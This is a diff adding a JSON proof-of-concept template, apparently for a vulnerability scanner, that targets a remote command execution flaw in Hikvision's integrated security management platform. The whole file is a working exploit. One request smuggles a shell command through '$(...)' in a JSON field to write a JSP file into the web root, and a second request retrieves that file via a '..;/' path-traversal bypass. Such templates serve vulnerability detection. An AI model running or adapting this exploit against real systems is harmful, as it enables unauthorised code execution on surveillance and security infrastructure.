@@ -1,0 +1,33 @@
+{
+  "poc": "HIKVISION综合安防管理平台installation远程命令执行",
+  "req":[
+    {
+      "method": "POST",
+      "uri": "/center/api/installation/detection;.js",
+      "headers":{
+        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "content-type": "application/json"
+      },
+      "data": "{\"type\": \"environment\", \"operate\": \"\", \"machines\": {\"id\": \"$(echo vuleyetest>/opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/vuleyetest.jsp)\"}}",
+      "check":{
+        "status": 500,
+        "header_words": [],
+        "body_words": ["服务器不在线"]
+      }
+    },
+    {
+      "method": "GET",
+      "uri": "/portal/ui/login/..;/..;/vuleyetest.jsp",
+      "headers":{
+        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "content-type": ""
+      },
+      "data": "",
+      "check":{
+        "status": 200,
+        "header_words": [],
+        "body_words": ["vuleyetest"]
+      }
+    }
+  ]
+}
